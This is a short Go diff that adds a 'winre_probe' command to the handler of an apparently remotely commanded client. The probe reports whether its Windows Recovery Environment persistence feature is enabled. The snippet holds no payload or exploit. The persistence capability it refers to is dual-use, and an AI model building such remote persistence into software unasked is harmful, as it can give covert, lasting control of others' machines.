@@ -2392,6 +2392,11 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 			return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: false, Message: err.Error()})
 		}
 		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: true})
+	case "winre_probe":
+		if !WinRESupported() {
+			return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: false, Message: "WinRE persistence is not enabled on this client"})
+		}
+		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: true})
 	case "winre_uninstall":
 		if err := handleWinREUninstall(ctx, env, cmdID); err != nil {
 			return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: false, Message: err.Error()})
